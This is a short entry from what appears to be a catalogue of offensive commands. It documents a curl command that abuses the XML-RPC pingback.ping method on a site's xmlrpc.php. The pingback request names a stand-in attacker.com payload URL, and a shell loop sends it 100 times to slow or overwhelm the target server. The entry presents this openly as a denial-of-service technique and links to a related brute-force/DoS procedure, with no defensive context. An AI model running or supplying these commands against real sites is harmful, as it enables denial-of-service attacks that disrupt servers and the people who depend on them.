---
id: cmd-curl-xmlrpc-dos
data: >-
  curl -d
  '<methodCall><methodName>pingback.ping</methodName><params><param><value><string>https://attacker.com/payload</string></value></param><param><value><string>https://target.com/</string></value></param></params></methodCall>'
  https://target.com/xmlrpc.php
tags:
  - dos
  - web
  - xmlrpc
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:48.187Z'
verified: false
validated: true
submitted: true
---
# curl-xmlrpc-dos

## Command

```bash
curl -d '<methodCall><methodName>pingback.ping</methodName><params><param><value><string>https://attacker.com/payload</string></value></param><param><value><string>https://target.com/</string></value></param></params></methodCall>' https://target.com/xmlrpc.php
```

## Description

Sends a pingback.ping XML-RPC request to consume server resources; repeat for DoS effect.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-d` | XML payload data | Yes |
| `https://target.com/xmlrpc.php` | Target endpoint | Yes |

## Examples

### Basic Usage

```bash
curl -d 'XML_PAYLOAD' https://target.com/xmlrpc.php
```

### Advanced Usage

```bash
for i in {1..100}; do curl -d 'XML_PAYLOAD' https://target.com/xmlrpc.php; done
```

## Expected Output

<?xml version="1.0"?>
<methodResponse>
...
</methodResponse>

Server may slow down after multiples.

## Related

- [[Related Procedure: Exploit-XML-RPC-for-Brute-Force-or-DoS]]
